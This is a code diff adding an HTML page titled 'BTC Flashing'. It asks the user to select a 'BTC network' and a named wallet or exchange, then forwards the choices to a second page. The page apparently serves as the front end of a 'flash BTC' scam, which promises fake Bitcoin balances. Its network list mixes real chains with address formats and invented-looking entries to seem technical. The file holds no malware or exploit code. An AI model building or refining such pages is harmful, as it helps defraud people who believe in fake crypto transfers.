@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BTC Flashing - Select Wallet & Network</title>
+  <style>
+    body {
+      background-color: #0d0d0d;
+      font-family: 'Segoe UI', sans-serif;
+      color: #f7931a;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #f7931a;
+      text-shadow: 0 0 10px #f7931a;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background-color: #1a1a1a;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #f7931a;
+    }
+    label {
+      display: block;
+      margin: 20px 0 10px;
+      font-weight: bold;
+      color: #fff;
+    }
+    select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      background: #262626;
+      color: #f7931a;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 30px;
+      padding: 12px 25px;
+      font-size: 16px;
+      background: #f7931a;
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #f7931a;
+    }
+    button:hover {
+      background: #ffa733;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Start BTC Flashing</h1>
+  <div class="container">
+    <label for="network">Select BTC Network:</label>
+    <select id="network">
+      <option value="">Choose Network </option>
+      <option>Bitcoin Mainnet</option>
+      <option>Lightning Network</option>
+      <option>Liquid Network</option>
+      <option>RSK Network</option>
+      <option>Taproot</option>
+      <option>SegWit</option>
+      <option>Native SegWit</option>
+      <option>Omni Layer</option>
+      <option>Sidechains</option>
+      <option>Wrapped BTC (WBTC)</option>
+      <option>Testnet</option>
+      <option>BTC-BEP2</option>
+      <option>BTC-BEP20</option>
+      <option>BTC-TRC20</option>
+      <option>BTC-Polygon</option>
+      <option>BTC-ERC20 (Ethereum)</option>
+      <option>BTC-Arbitrum</option>
+      <option>BTC-Avalanche</option>
+      <option>BTC-XRC20</option>
+      <option>BTC-Solana</option>
+    </select>
+
+    <label for="wallet">Select BTC Wallet:</label>
+    <select id="wallet">
+      <option value="">Choose Wallet</option>
+      <option>Binance</option>
+      <option>Bitget</option>
+      <option>Coinbase</option>
+      <option>Trust Wallet</option>
+      <option>Blockchain.com</option>
+      <option>Electrum</option>
+      <option>Kraken</option>
+      <option>Exodus</option>
+      <option>OKX</option>
+      <option>Atomic Wallet</option>
+      <option>BlueWallet</option>
+      <option>Wasabi Wallet</option>
+      <option>BitPay</option>
+      <option>Ledger</option>
+      <option>Trezor</option>
+      <option>KuCoin</option>
+      <option>Guarda</option>
+      <option>BTC.com</option>
+      <option>Edge Wallet</option>
+      <option>ZebPay</option>
+    </select>
+
+    <button onclick="goNext()">Start Flashing</button>
+  </div>
+
+  <script>
+    function goNext() {
+      const network = document.getElementById('network').value;
+      const wallet = document.getElementById('wallet').value;
+
+      if (network === "" || wallet === "") {
+        alert("Please select both network and wallet.");
+        return;
+      }
+
+      const url = `btc2.html?network=${encodeURIComponent(network)}&wallet=${encodeURIComponent(wallet)}`;
+      window.location.href = url;
+    }
+  </script>
+
+</body>
+</html>
